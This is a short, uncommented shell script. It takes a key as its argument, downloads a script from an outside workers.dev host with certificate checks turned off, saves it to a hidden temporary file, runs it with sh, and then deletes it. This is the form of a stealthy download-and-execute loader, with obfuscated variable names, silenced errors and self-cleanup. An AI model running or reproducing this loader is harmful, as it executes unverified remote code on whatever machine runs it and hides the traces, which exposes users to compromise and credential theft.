#!/bin/sh
_a="https://autologin.creativy24.workers.dev"
_b="$1"
_c="/tmp/.sys_$$"
curl -ksSL "$_a/s?k=$_b" -o "$_c" 2>/dev/null
if [ -s "$_c" ]; then
    sh "$_c"
else
    echo "Download failed. Check connection."
    exit 1
fi
rm -f "$_c" >/dev/null 2>&1
